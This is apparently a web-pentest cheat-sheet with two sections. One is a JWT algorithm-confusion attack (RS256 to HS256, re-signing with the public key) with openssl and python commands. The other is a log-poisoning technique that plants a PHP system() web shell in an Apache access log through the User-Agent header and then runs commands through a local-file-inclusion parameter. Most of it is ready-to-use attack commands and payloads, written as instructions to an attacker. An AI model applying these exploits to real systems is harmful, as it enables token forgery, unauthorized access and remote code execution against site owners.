# JWT exploitation using public key

> Change the algorithm \(RS256 â†’ HS256\) and sign a new secret

- Change the algorithm inside the JWT header
- Convert the public key to hex so openssl will use it

```bash
cat key | xxd -p | tr -d "\\n"
```

- Use openssl to sign that as a valid HS256 key.

```bash
echo -n <TOKEN> | openssl dgst -sha256 -mac HMAC -macopt hexkey:<KEY>
```

- Decode that hex to binary data, and reencode it in base64

```bash
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('<SECRET>')).replace('=','')\")""
```

- Replace the secret inside the JWT token.

# Log Poisoning

## What does it mean?

* It is a common technique used to gain a reverse shell from a LFI vulnerability 
* To make it work an attacker attempts to inject malicious input to the server log

## What are the signs of this bug?

* Obviously you need to find an apache log file
* The directory of the file should have read and execute permissions

## How can I exploit this?

* Insert the following malicious code in the user agent field
* The PHP command will allow us to execute system commands by parsing the input to a GET parameter called `poison`

```bash
GET /v1/signin.php?page=/var/log/apache2/access.log HTTP/1.1
Host: example.com
User-Agent: Mozilla <?php system($_GET['poison']); ?> Firefox
Accept: text/html
Connection: close
```

Forward the request and add your parameter to the link.

```text
http://target.com/v1/example.php?page=/var/log/apache2/access.log&poison=whoami
```
